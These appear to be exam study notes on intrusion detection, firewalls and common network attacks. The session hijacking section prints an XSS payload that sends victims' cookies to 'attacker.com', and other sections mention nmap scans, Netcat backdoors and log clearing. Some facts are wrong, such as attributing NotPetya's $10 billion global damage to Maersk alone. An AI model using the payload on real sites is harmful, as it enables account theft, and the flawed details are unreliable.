Differentiate between Anomaly Detection and Misuse Detection
Mnemonic
"Anomaly = Alien behaviour · Misuse = Match the mugshot"
Anomaly detects what is unusual (no prior knowledge needed) · Misuse detects what matches a known bad signature
Definitions (Stallings)

Anomaly Detection (Statistical / Behaviour-based): Establishes a baseline of normal behaviour and raises an alert when observed activity deviates significantly from that baseline.

Misuse Detection (Signature-based / Knowledge-based): Maintains a database of known attack patterns (signatures) and raises an alert when observed activity matches a known signature.

Q1b4 Marks
What are the limitations of Anomaly-Based Intrusion Detection?
Mnemonic — 6 Limitations
"HITFAC — Hard to teach, Intruders sneak in, Too many alerts, False sense, Attacks slowly, Computationally heavy"
High false positives · Insider threats missed · Training overhead · False sense of security · Slow/gradual attacks bypass · Computational cost
Quick Definition

Anomaly-based IDS builds a statistical model of normal user/system behaviour and flags deviations. While powerful for detecting unknown attacks, it has several critical limitations that make it hard to deploy reliably.

  • High False Positive Rate: Legitimate but unusual activity (e.g., an admin running a large batch job at night) is flagged as an attack. Security teams get overwhelmed with false alerts — called "alert fatigue." This is the single biggest limitation.
  • Difficult Baseline Training: Building an accurate "normal" profile requires weeks of clean, representative traffic. If training data contains hidden attacks, the baseline itself is corrupted — garbage in = garbage out.
  • Slow/Gradual Attacks Bypass Detection: A smart attacker who slowly changes behaviour over time (staying within threshold) can train the IDS to accept malicious activity as "normal." Called a mimicry attack.
  • Insider Threats Difficult to Catch: A legitimate employee who has access behaves "normally" even while stealing data. Anomaly IDS cannot distinguish authorized access from insider theft if the pattern looks normal.
  • Computational Overhead: Continuously building and comparing statistical models requires significant CPU and memory. Hard to run in real-time on high-speed networks (1Gbps+).
  • Dynamic Environments: Normal behaviour changes (new software, new users, seasonal traffic spikes). IDS needs constant re-tuning or it becomes inaccurate. A system that's never updated is worse than having no IDS.
Exam Note

Always contrast with signature-based detection when listing limitations. A common exam trick: "high false positives" and "cannot detect new attacks" — the second one is for SIGNATURE-based, not anomaly-based. Don't mix them up!

Q1c4 Marks
Explain Signature-Based Intrusion Detection
Mnemonic
"SIGDET — Scan, Identify, Generate signature, DEtect, Take action"
Captures traffic → Matches against signature DB → Alerts if match found → Responds
Definition (Stallings)

Signature-based IDS (also called Misuse Detection) works by maintaining a database of known attack patterns called signatures. It monitors network traffic or system events and compares them against this database. When a match is found, an alert is triggered. It is the most widely used IDS technique.

  • Signature Database: The heart of the system. Contains thousands of patterns of known attacks — specific byte sequences, protocol anomalies, or system call sequences. Updated regularly (like antivirus definitions). Example: Snort IDS has 50,000+ signatures.
  • How Matching Works: Three methods: (a) Exact match — byte-for-byte match with signature. (b) Heuristic match — partial matching using rules. (c) State-based match — tracks multi-step attacks across several packets.
  • Rule-Based Detection: Systems like Snort use rules in format: alert tcp any any → any 80 (content:".."; msg:"Attack!"; sid:1001) — very precise and customizable.
  • Advantages: Very low false positives (exact match required), fast processing, easy to understand and audit, works well for known malware/attacks.
  • Limitations: Cannot detect zero-day attacks (no signature exists yet), requires constant database updates, attackers can evade by slightly modifying attack to break signature match (polymorphic malware).
Real-World Example — Snort IDS

Snort (open-source) is the world's most deployed signature-based IDS. When a packet arrives containing "/etc/passwd" in an HTTP request body, Snort matches it against a known web attack signature and fires an alert: "Possible directory traversal attack." This takes microseconds because it's a simple string match.

3 Types of Intrusion Detection (Full Picture)

1. Signature-based (Misuse): Match known patterns — best for known attacks.
2. Anomaly-based (Statistical): Detect deviation from normal — best for unknown attacks.
3. Specification-based: Define what IS allowed (whitelist approach) — most accurate but hardest to set up.
4. Hybrid: Combines all above — most comprehensive, used in modern enterprise IDS.

Explain the Taxonomy of Information Warfare (IW)
Mnemonic — 7 Classes of IW
"CHIN-EPI — Command, Hacker, Intelligence, Network, Economic, Psychological, Information"
Command & Control · Hacker · Intelligence-based · Network · Economic · Psychological · Information
Definition

Information Warfare (IW) is the use of information and information systems as weapons to gain competitive advantage over an adversary. The taxonomy (classification) of IW organizes it into distinct categories based on the type of attack or the target system.

  • 1. Command and Control Warfare (C2W): Attacking the enemy's ability to command its forces. Targets: communication links, headquarters, decision-making systems. Goal: cut off commanders from their troops. Military example: jamming enemy radio communications during combat. Civilian example: DDoS on government emergency services.
  • 2. Intelligence-Based Warfare (IBW): Using technology to gather intelligence AND deny enemy the same. Includes surveillance drones, satellite imagery, signals intelligence (SIGINT). Example: NSA's PRISM programme — collecting internet communications globally.
  • 3. Electronic Warfare (EW): Use of electromagnetic spectrum to attack or deceive. Includes radar jamming, GPS spoofing, electronic countermeasures. Example: Russian GPS spoofing near NATO borders disrupting ship navigation in Black Sea.
  • 4. Psychological Warfare (PSYWAR): Using information to influence, manipulate, or demoralize the enemy or civilian population. Tools: propaganda, fake news, social media manipulation. Example: Cambridge Analytica — targeted political messaging to influence elections.
  • 5. Hacker Warfare: Using hacking techniques to disrupt or destroy enemy information systems. Example: Anonymous collective attacking government websites during political protests.
  • 6. Economic Information Warfare: Targeting financial systems, stock markets, banking networks. Goal: economic destabilization. Example: NotPetya malware (2017) caused $10 billion damage to global shipping company Maersk by encrypting their entire network.
  • 7. Cyber Warfare: Nation-state level attacks on critical infrastructure — power grids, water systems, financial systems. Example: Stuxnet (Iran nuclear centrifuges), Colonial Pipeline attack (USA fuel supply disruption).
Key Real-World Example — Stuxnet (2010)

Stuxnet was a joint US-Israel cyber weapon that combined Intelligence-Based IW (surveillance of Iranian nuclear program) + Cyber Warfare (destroying physical centrifuges through software). It was the first known cyber weapon to cause physical destruction. A perfect example of multi-class IW taxonomy.

Explain Wireless-Based Attacks with suitable illustrations
Mnemonic — Types of Wireless Attacks
"RIDE a WARS — Rogue AP, Interference, Deauth, Evil Twin · WEP crack, ARP poison, Replay, Sniffing"
Passive attacks (sniffing) → Active attacks (injection, deauth) → Man-in-Middle (Evil Twin, Rogue AP)
  • 1. Passive Sniffing / Eavesdropping: Attacker uses a wireless card in promiscuous mode to capture all packets on the network. Wi-Fi signals broadcast in all directions — anyone in range can "listen." Old WEP-encrypted networks are fully readable after cracking. Tool: Wireshark, Aircrack-ng. Illustration: Attacker sits in coffee shop, captures unencrypted HTTP traffic from other users.
  • 2. Rogue Access Point (Rogue AP): Attacker sets up an unauthorized Wi-Fi access point that looks legitimate. Employees connect to it thinking it's the company network. All traffic goes through the attacker. Also called an "Evil Twin" attack when it mimics a real AP's SSID exactly. Example: At airport, attacker creates "Airport_Free_WiFi" — identical to real hotspot name.
  • 3. Deauthentication Attack: Wi-Fi management frames (802.11) are unencrypted. Attacker sends fake deauthentication frames to disconnect victims from the legitimate AP, forcing them to reconnect — often to a rogue AP. Tool: Aireplay-ng. This is how WPA2 4-way handshake capture works for offline cracking.
  • 4. WEP/WPA Cracking: WEP (Wired Equivalent Privacy) is completely broken — can be cracked in minutes using IV (Initialization Vector) reuse attacks. WPA2 uses dictionary attacks against the captured 4-way handshake. Example: Aircrack-ng tool can crack a weak WPA2 password from a captured handshake in hours.
  • 5. ARP Poisoning on Wireless: Once on the same Wi-Fi network, attacker sends fake ARP replies to associate the router's IP with the attacker's MAC address. All traffic meant for the router flows through the attacker. This is classic MITM over wireless.
  • 6. Jamming / Interference: Flooding the 2.4GHz or 5GHz spectrum with radio noise to cause denial of service — legitimate devices cannot communicate. Physical attack — hard to defend without specialized RF equipment.

Q2c4 Marks
What are the phases of carrying out an Electronic Attack? Explain each in brief.
Mnemonic — 6 Attack Phases
"Real Spies Scan Every Exploit, Then Cover Tracks" = RS·SEETC
Reconnaissance → Scanning → Enumeration → Exploitation → Escalation → Tracks Covered
Definition

An electronic (cyber) attack follows a structured methodology known as the "Attack Lifecycle" or "Kill Chain." Each phase builds on the previous one. Understanding these phases helps defenders identify and interrupt attacks at the earliest possible stage.

  • Phase 1 — Reconnaissance (Intelligence Gathering): Collecting information about the target WITHOUT touching the target's systems. Passive: Google dorking, WHOIS lookup, LinkedIn scraping, Shodan (IoT search engine). Active: DNS queries, traceroute. Goal: Build a complete map of the target — IP ranges, employees, technologies used.
  • Phase 2 — Scanning & Probing: Actively probe target systems to find open ports, running services, and OS versions. Tools: Nmap (port scanner), Nessus (vulnerability scanner). Example: nmap -sV 192.168.1.0/24 reveals all open ports and service versions on the network.
  • Phase 3 — Enumeration: Extract detailed information from discovered services — usernames, shared resources, group policies, network topology. Example: If SMB port 445 is open, enumerate shared folders and user accounts using enum4linux.
  • Phase 4 — Exploitation / Gaining Access: Use discovered vulnerabilities to break in. Methods: exploit unpatched CVE, use stolen credentials, SQL injection, social engineering (phishing email). Example: EternalBlue exploit (used by WannaCry) exploited unpatched SMB vulnerability to gain shell access.
  • Phase 5 — Privilege Escalation & Lateral Movement: Start with limited access, escalate to admin/root. Move laterally to reach high-value targets. Example: Attacker gains user shell → finds sudo misconfiguration → becomes root → moves to database server.
  • Phase 6 — Maintaining Access & Covering Tracks: Install backdoors, rootkits, or RATs (Remote Access Trojans) for persistent access. Clear logs (Windows Event Log, /var/log/auth.log) to hide presence. Example: Attacker installs Netcat backdoor on port 4444, deletes bash history, clears auth logs.
Key Insight — Lockheed Martin Cyber Kill Chain

Lockheed Martin formalized this as the "Cyber Kill Chain" with 7 phases: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control (C2) → Actions on Objectives. Defenders aim to "break the chain" as early as possible — ideally at Reconnaissance or Delivery.

Explain Session Hijacking in brief
Mnemonic — Steps of Session Hijacking
"Sniff, Steal, Slide In, Stay Hidden" = S·S·S·S
Sniff network → Steal session token → Slide into session → Stay hidden while victim is logged out
Definition (Stallings)

Session Hijacking is an attack where an attacker takes over a legitimate user's active session by stealing or predicting the session token (session ID) issued by the server after the user's login. The attacker impersonates the user without needing their password.

  • Why Sessions Exist: HTTP is stateless — each request is independent. Servers issue a Session ID (cookie/token) after login so the user doesn't re-authenticate every click. This session ID is the "key" the attacker wants to steal.
  • Step 1 — Session Sniffing: On an unencrypted (HTTP) network, attacker captures packets and extracts the session cookie. Tool: Wireshark or BetterCap. Example: User logs into an HTTP site at a coffee shop — attacker reads their session cookie from Wi-Fi traffic.
  • Step 2 — Session Token Prediction: If the server generates predictable session IDs (sequential numbers: 1001, 1002, 1003...), the attacker guesses valid session IDs. Old PHP applications were notorious for this vulnerability.
  • Step 3 — Cross-Site Scripting (XSS) Cookie Theft: Attacker injects malicious JavaScript into a webpage. When victim visits the page, the script runs and sends their session cookie to the attacker's server. Example: <script>document.location='http://attacker.com/?c='+document.cookie</script>
  • Step 4 — Man-in-the-Middle (MITM): Attacker intercepts live session traffic and can both read AND modify requests/responses in real-time — most dangerous form.
  • Countermeasures: Use HTTPS (encrypts session cookies), HttpOnly flag (prevents JavaScript from reading cookies), Secure flag (cookies only sent over HTTPS), Session timeout, Re-authentication for sensitive actions, Token binding (TLS channel binding).

Types of Denial of Service (DoS) Attacks — Explain in brief
Mnemonic — DoS Types
"SAFE BURP — SYN, Amplification, Flood, Exhaustion, Botnet, UDP, Reflection, Ping of death"
Covers all major DoS/DDoS attack types — volumetric, protocol, and application layer
Definition

A Denial of Service (DoS) attack attempts to make a system or network resource unavailable to its intended users by overwhelming it with malicious traffic or exploiting vulnerabilities that consume all available resources.

  • 1. SYN Flood Attack: Exploits TCP 3-way handshake. Attacker sends thousands of SYN packets with spoofed source IPs. Server sends SYN-ACK and waits for ACK that never comes — fills up connection table → legitimate connections refused. Classic DoS attack. Countermeasure: SYN cookies, firewall rate limiting.
  • 2. Ping of Death: Sends oversized ICMP (ping) packets exceeding 65,535 bytes (max IP packet size). Old systems couldn't handle reassembly → buffer overflow → crash. Historic attack — patched in all modern OS. Still relevant for exams!
  • 3. UDP Flood: Sends massive amounts of UDP packets to random ports on the target. Target checks for application listening on each port, sends "Port Unreachable" ICMP back → CPU/bandwidth exhausted. Easy to launch — no connection needed.
  • 4. HTTP Flood (Application Layer): Sends legitimate-looking HTTP GET/POST requests in massive volume. Bypasses network-level defenses because requests look valid. Hard to distinguish from real traffic. Example: Slowloris attack — opens partial HTTP connections and holds them open, exhausting server threads.
  • 5. Amplification / Reflection Attack: Attacker sends small request with spoofed victim IP to a public server (DNS, NTP). Server sends large response to the VICTIM. Amplification factor: DNS = 28–54x, NTP = 556x. Example: NTP amplification — 1 Mbps request → 556 Mbps attack on victim.
  • 6. DDoS (Distributed DoS): Thousands of compromised machines (botnet) attack simultaneously. Scale: 1–3 Tbps. Near impossible to filter. Example: Mirai botnet (2016) — compromised IoT devices (cameras, routers) generated 1.2 Tbps, took down Dyn DNS.
3 Layers of DoS Attacks

Layer 3/4 — Volumetric: SYN Flood, UDP Flood, Ping of Death — overwhelm with packet volume.
Layer 4 — Protocol: Amplification, Reflection — exploit protocol weaknesses.
Layer 7 — Application: HTTP Flood, Slowloris — exhaust server resources with valid-looking requests.
Modern DDoS protection requires defense at ALL three layers simultaneously.

Q3c4 Marks
Explain Packet Fragmentation and Buffer Overflow Attack
Mnemonic — Remember Both
"Fragments FOOL the firewall · Buffer BREAKS the boundary"
Fragmentation = split packets to bypass inspection · Buffer Overflow = write beyond memory boundary to execute code
Part A — Packet Fragmentation Attack

Definition: IP allows large packets to be split into smaller fragments for transmission across networks with different MTU (Maximum Transmission Unit) sizes. Attackers exploit the fragmentation and reassembly process to evade security inspection and crash systems.

  • How Normal Fragmentation Works: A 4000-byte packet going through a link with MTU=1500 is split into 3 fragments. Destination reassembles them. Each fragment has an Offset field indicating where it belongs in the original packet.
  • Tiny Fragment Attack: Attacker creates very small first fragment (8 bytes) that splits TCP header across two fragments. Packet filter sees first fragment and cannot determine the port/flags. Many older firewalls only check the first fragment → attack slips through.
  • Teardrop Attack: Attacker sends overlapping fragments with incorrect offsets — Fragment 2 claims to start before Fragment 1 ends. When target tries to reassemble, it calculates negative length → buffer underflow → OS crash. Exploited Windows 95/NT — fully patched today.
  • Fragment Overlap Attack: First fragment appears innocent (e.g., harmless DNS query). Overlapping second fragment rewrites the payload with malicious content. IDS/firewall sees the first, benign fragment — malicious second fragment bypasses inspection.
Part B — Buffer Overflow Attack

Definition (Stallings): A Buffer Overflow occurs when a program writes data beyond the allocated memory buffer, overwriting adjacent memory. Attackers craft input that overwrites the Return Address on the stack to redirect program execution to malicious shellcode.

  • How Memory Stack Works: When a function is called, the stack stores: local variables (buffer) + saved frame pointer + return address. The Return Address tells the CPU where to go after the function finishes.
  • The Attack: If a program does strcpy(buffer, userInput) without checking length, and userInput is 200 bytes but buffer is only 100 bytes — the extra 100 bytes overwrite the return address with the attacker's chosen address (shellcode location).
  • Shellcode: Attacker includes executable machine code in their input. After overwriting return address to point to this code, the program executes the attacker's shell commands — typically spawning a root shell.
  • Real Example: Morris Worm (1988) — first famous worm — used buffer overflow in fingerd daemon to spread. SQL Slammer (2003) used SQL Server buffer overflow to infect 75,000 servers in 10 minutes.
  • Countermeasures: Stack Canaries (detect overflow before return), ASLR (Address Space Layout Randomization — randomize memory addresses), DEP/NX bit (mark stack as non-executable), Safe functions (strncpy instead of strcpy), Code auditing.
Buffer Overflow — Stack Illustration
NORMAL (safe input "Hi"):
  [ buffer: "Hi\0........" ][ frame ptr ][ return addr: main() ]
  Program returns normally to main() ✅

ATTACK (malicious 200-byte input):
  [ buffer: "AAAAAAAAAAAAA... ][ BBBBBBBB ][ 0xDEADBEEF ← shellcode ]
                              overwritten!    return addr HIJACKED!

Q4a4 Marks
Purpose of Firewall + Stateful Firewalls and Switched Firewall explained
Mnemonic — Firewall Types
"PASTA — Packet filter, Application proxy, Stateful, Transport, Advanced"
Each generation adds intelligence: Packet (L3) → Stateful (L4) → Application Proxy (L7)
Purpose of Firewall (Stallings Definition)

A firewall is a network security device (hardware or software) that monitors and controls incoming and outgoing network traffic based on predetermined security rules. It establishes a barrier between a trusted internal network and untrusted external networks (like the internet). Purpose: enforce access control policy, log traffic, and act as the first line of defence.

What firewalls protect against
  • Unauthorized access to internal network from outside
  • Port scanning and reconnaissance attacks
  • Known malicious IP addresses and domains
  • Outbound connections to C2 (Command & Control) servers
  • Protocol-level attacks (IP spoofing, SYN floods at network edge)
Stateful Firewall — Definition & How It Works

Definition: A Stateful Firewall (also called Stateful Packet Inspection — SPI) maintains a state table that tracks the state of all active network connections. It makes filtering decisions based not just on individual packets but on the CONTEXT of the entire connection.

  • State Table: Records every connection: Source IP, Dest IP, Source Port, Dest Port, Protocol, Connection State (SYN_SENT, ESTABLISHED, FIN_WAIT). Each packet is checked against this table.
  • How it's smarter than packet filters: A packet filter allows all TCP port 80 traffic (HTTP). A stateful firewall only allows TCP port 80 traffic that is part of an ESTABLISHED connection initiated from the inside — blocking spoofed or unexpected inbound packets.
  • TCP State Tracking: Tracks SYN → SYN-ACK → ACK (connection established). If a packet arrives without a matching SYN in the state table → DROPPED. This defeats many SYN flood variants.
  • Limitation: Cannot inspect encrypted traffic (HTTPS). Cannot detect application-layer attacks (SQL injection). Cannot track UDP (connectionless) as accurately — UDP entries expire after timeout.
Switched Firewall — Definition

A Switched Firewall (also called a Transparent Firewall or Layer 2 Firewall) operates at the Data Link Layer (Layer 2 — MAC addresses) rather than Layer 3 (IP addresses). It works like a network switch but with firewall rules — it is invisible to the network (no IP address on the data path).

  • Key property — Transparent: The firewall has no IP address on the interfaces connecting to internal and external networks. It cannot be seen or attacked via IP. An attacker cannot directly target it.
  • Use case: Inserting a firewall between two networks WITHOUT changing IP addressing scheme. No need to reconfigure routers or hosts. Ideal for adding security to an existing network with minimal disruption.
  • Advantage over routed firewalls: Cannot be detected by standard network scanning (no IP = invisible). Eliminates firewall as a direct attack target. Lower latency (no IP routing decisions).
Example — Enterprise Deployment

A bank uses a stateful firewall at the internet edge to track all TCP connections. Inside the data centre, a switched (transparent) firewall sits between the web server VLAN and the database VLAN — invisible to both sides but enforcing strict connection rules between them. Together: defence in depth.

Q4b4 Marks
Role of Authentication and Encryption in developing a Secure Information System
Mnemonic — Auth + Encryption Goals
"Auth = WHO are you? · Encrypt = HIDE what you say"
Authentication → Identity verification (CIA: mostly integrity & availability) · Encryption → Confidentiality (CIA: confidentiality + integrity)
Role of Authentication
Definition

Authentication is the process of verifying the claimed identity of a user, system, or entity before granting access. It answers: "Are you really who you claim to be?"

  • 3 Factors of Authentication (MFA): Something you KNOW (password, PIN) + Something you HAVE (OTP token, smart card) + Something you ARE (fingerprint, retina scan). Using 2+ factors = Multi-Factor Authentication (MFA) — exponentially harder to compromise.
  • Role in Secure Systems: (a) Access Control: only authenticated users enter. (b) Non-repudiation: user cannot deny their actions (digital signatures). (c) Audit Trail: log who did what and when. (d) Prevents unauthorized access — even if password is stolen, MFA stops the attacker.
  • Authentication Protocols: Kerberos (enterprise — ticket-based, no password over network), OAuth 2.0 (web — token-based), RADIUS (network access), LDAP (directory services). Example: Kerberos used in Windows Active Directory for all enterprise authentication.
  • Cryptographic Authentication: Digital Signatures (RSA, ECDSA) — mathematically prove identity without revealing private key. Used in SSL/TLS certificates, email signing (S/MIME), code signing.
Role of Encryption
Definition

Encryption is the process of transforming plaintext data into unreadable ciphertext using a cryptographic algorithm and key. Only parties with the correct decryption key can read the original data.

  • Symmetric Encryption (AES): Same key for encrypt and decrypt. Fast — used for bulk data. AES-256 is the gold standard — used for disk encryption (BitLocker), VPNs, file encryption. Key problem: how do you securely share the key?
  • Asymmetric Encryption (RSA/ECC): Public key encrypts, private key decrypts. Solves key distribution problem — share public key freely. Used for SSL/TLS handshake, digital signatures, certificate authorities. Slower than AES — used for key exchange, not bulk data.
  • Role in Secure Systems: (a) Confidentiality: data unreadable to eavesdroppers (HTTPS). (b) Integrity: hash + encryption detects tampering (HMAC). (c) Authentication: digital certificates prove server identity. (d) Non-repudiation: digital signatures. (e) Data at rest: AES-256 full disk encryption protects stolen hardware.
  • Combined Role — TLS (HTTPS): Uses RSA/ECDHE for key exchange (asymmetric) + AES for session data (symmetric) + SHA-256 for integrity (hashing) + X.509 certificates for authentication. All four security goals achieved in one protocol.
Real-World: WhatsApp End-to-End Encryption

WhatsApp uses the Signal Protocol: Curve25519 (asymmetric, key exchange) + AES-256 (symmetric, message encryption) + HMAC-SHA256 (integrity). Authentication: each phone has a unique key pair. Result: even WhatsApp servers cannot read your messages — true end-to-end confidentiality + integrity + authentication.

Differentiate between Positive Filtering and Negative Filtering
Mnemonic
"Positive = Party with VIP list (whitelist) · Negative = Bouncer with banned list (blacklist)"
Positive filtering: allow only what's explicitly permitted · Negative filtering: block only what's explicitly forbidden
✅ Positive Filtering (Whitelist)
  • Allow ONLY what is explicitly in the approved list
  • Everything else is DENIED by default
  • More secure — unknown threats blocked automatically
  • Higher maintenance — must approve every new legitimate item
  • Used in: Application whitelisting, strict firewall rules
  • Example: Only allow HTTP(80), HTTPS(443), DNS(53) — all other ports BLOCKED
❌ Negative Filtering (Blacklist)
  • Block ONLY what is explicitly in the banned list
  • Everything else is ALLOWED by default
  • Less secure — new unknown threats pass through
  • Lower maintenance — only update when new threat found
  • Used in: Antivirus signatures, spam filters, URL blacklists
  • Example: Block known malicious IPs, block port 23 (Telnet) — everything else allowed
BasisPositive FilteringNegative Filtering
Also calledWhitelist / Allow-listBlacklist / Deny-list
Default actionDENY all (allow exceptions)ALLOW all (deny exceptions)
Security levelVery highModerate
Zero-day attacks✅ Blocked (not in whitelist)❌ Pass through (not blacklisted yet)
MaintenanceHigh (must whitelist everything)Low (only add new bad items)
False positivesHigh (blocks legit new traffic)Low

Exam Tip — Which is better?

Neither is "better" universally — the choice depends on context. Banks use positive filtering (whitelist everything). ISPs use negative filtering (blacklist known malicious IPs). Best practice: use both together — positive filtering as the primary control, negative filtering as a secondary layer to catch known bad traffic that somehow got whitelisted.

Explain Operating System Level Intrusion Detection
Mnemonic — What OS-Level IDS Monitors
"SAFLS — Syscalls, Audit logs, File integrity, Login events, System calls"
System Calls · Audit Logs · File Integrity · Login/Logoff · Registry Changes (Windows)
Definition

Operating System Level Intrusion Detection (also called Host-Based IDS or HIDS at OS level) monitors system-level events occurring within a single host — system calls, process activity, file access, registry changes, and audit logs — to detect intrusions or policy violations happening INSIDE the machine.

  • System Call Monitoring: Every interaction between a user program and the OS kernel happens through system calls (open, read, write, exec, fork). HIDS intercepts and analyses these calls. Unusual sequences (e.g., a web server making exec() calls) indicate attack. Tools: LIDS (Linux IDS), auditd, Windows Event Log.
  • Audit Log Analysis: OS maintains security logs: login attempts, privilege escalation, file access, network connections. HIDS analyses these logs in real-time. Example: 100 failed login attempts to /etc/shadow in 60 seconds → brute force alert.
  • File Integrity Monitoring (FIM): Creates cryptographic hashes (MD5/SHA-256) of critical system files (/etc/passwd, /bin/ls, registry keys). Periodically re-hashes and compares. Any change = alert. Tool: Tripwire, AIDE (Advanced Intrusion Detection Environment). Catches rootkits and backdoors that replace system binaries.
  • Process Monitoring: Tracks running processes, their parent-child relationships, and resource usage. Unusual processes (e.g., Apache spawning bash shell — PHP webshell indicator!) trigger alerts.
  • Registry Monitoring (Windows): Malware often modifies Windows registry for persistence (HKLM\Software\Microsoft\Windows\CurrentVersion\Run). HIDS monitors critical registry keys for unauthorized changes.
  • Advantages over Network IDS: Can see encrypted traffic (already decrypted at host level). Can detect insider threats. Can catch local privilege escalation. No network tap needed.
  • Limitations: Only sees one host. Attacker who compromises OS can disable HIDS. High overhead on host CPU. Does not detect attacks that don't reach the host (network-level attacks blocked before reaching host).
Real-World Tool — OSSEC (Open-Source HIDS)

OSSEC is the most popular open-source HIDS. It does: real-time log analysis, file integrity checking, rootkit detection, policy monitoring, and active response (automatically blocks attacking IPs). Used by thousands of organizations. Works on Linux, Windows, macOS, and Solaris.

Components of Network-Based IDPS + Sensor Architecture of Inline Network-Based IDPS
Mnemonic — NIDPS Components
"SCAN-R — Sensor, Console, Analyser, Network tap, Response engine"
5 core components of any Network-Based IDPS
Definition

A Network-Based Intrusion Detection and Prevention System (NIDPS) monitors and analyses network traffic in real-time across an entire network segment. Unlike HIDS, it does not require agents on individual hosts — one sensor can protect many hosts simultaneously.

5 Components of Network-Based IDPS
  • 1. Sensor / Monitoring Engine: The component that captures and inspects raw network packets. Placed at strategic network points (internet edge, DMZ, internal network segments). Uses Deep Packet Inspection (DPI) to examine packet payload, not just headers.
  • 2. Signature / Rule Database: Contains thousands of attack signatures, protocol anomaly rules, and behavioural models. Updated regularly (like antivirus definitions). The "brain" that decides what is malicious. Snort has 50,000+ signatures.
  • 3. Analyser / Detection Engine: Compares captured traffic against the signature database and anomaly models. Performs stateful protocol analysis, reassembles fragmented packets, decodes protocols. Makes alert/block decisions.
  • 4. Management Console / Dashboard: Centralized interface for security analysts. Displays alerts, generates reports, allows rule configuration, correlation of events across multiple sensors. Examples: Splunk SIEM, Elastic Security.
  • 5. Response Engine: Takes automated action when an attack is detected. Actions: TCP Reset (sends RST packet to kill connection), Firewall rule insertion (dynamic block), SNMP alert, email notification, packet capture (evidence preservation).
Sensor Architecture — Inline vs Passive
Passive (Promiscuous) Sensor
  • Receives a COPY of traffic (via SPAN port or network tap)
  • IDS mode only — can detect but cannot BLOCK in real-time
  • No latency added to network traffic
  • Cannot stop attack already in progress
  • No single point of failure
Inline Sensor (IPS Mode)
  • Sits DIRECTLY in the traffic path (like a firewall)
  • Can BLOCK malicious packets in real-time
  • Adds latency (must inspect before forwarding)
  • Can stop attack in progress
  • Single point of failure — must have bypass/failover

Comparison chart of various Open-Source Tools for Intrusion Detection — Features and Limitations
Mnemonic — Remember 5 Key Tools
"SNOSA — Snort, Network Flight Recorder, OSSEC, Suricata, Auditd"
The 5 most important open-source IDS/IPS tools for exams and real-world use
ToolTypeKey FeaturesLimitations
Snort NIDS/NIPS World's most deployed. 50,000+ signature rules. Real-time traffic analysis, protocol decoding, packet logging. Modes: sniffer, packet logger, NIDS. Rule language easy to write. Community support is massive. Single-threaded (poor performance on 10Gbps+). No built-in dashboard. No encryption analysis. High false positive rate without tuning. Steep learning curve for custom rules.
Suricata NIDS/NIPS Multi-threaded (much faster than Snort). GPU acceleration support. Snort rule compatible. Built-in HTTP/TLS/SMB protocol analysis. JSON output for easy SIEM integration. File extraction capability. Higher memory usage. Newer = smaller community than Snort. Complex configuration. Some Snort rules don't translate perfectly.
OSSEC HIDS Real-time log analysis. File integrity monitoring (FIM). Rootkit detection. Active response (auto-block IPs). Agent-based — works on Linux, Windows, macOS, BSD. Centralized management for 1000s of hosts. HIDS only — no network traffic analysis. Agent must be installed on every host. Complex setup for large environments. Limited GUI (Kibana/Wazuh needed). Cannot prevent network attacks.
Zeek (Bro) Network Monitor Deep protocol analysis and logging. Creates rich structured logs (HTTP, DNS, FTP, SSL). Excellent for forensics and threat hunting. Scripting language (Zeek Script) for custom detection logic. Used by national labs. Not a traditional IDS — no default alerts. Requires significant expertise. No GUI (must use with Elastic/Splunk). Not designed for real-time blocking. Very complex to tune.
NFR Security (Network Flight Recorder) NIDS Policy-based detection engine. N-code scripting language for custom rules. Good for specification-based detection. Captures full packet content. Enterprise-grade sensor management. Commercial product (limited open-source version). Less community support than Snort. Outdated — less actively maintained. Vendor lock-in for rule updates.
Wazuh HIDS + SIEM OSSEC fork with modern GUI (Kibana). Built-in SIEM, FIM, vulnerability detection. Compliance (PCI-DSS, GDPR, HIPAA) dashboards. Cloud-native support (AWS, Azure, GCP). High resource requirements for server. Complex setup. HIDS-focused — needs Suricata/Zeek for network visibility. Can be overwhelming for small teams.
Recommended Architecture — Best of All Worlds

Suricata (inline NIPS at network edge) + Wazuh/OSSEC (HIDS on all servers) + Zeek (deep protocol logging) + Elastic SIEM (central dashboard and correlation).

This is what modern SOCs (Security Operations Centres) actually deploy. Together they cover: network attacks, host-level attacks, protocol anomalies, and provide a unified alert dashboard with 24/7 monitoring capability.
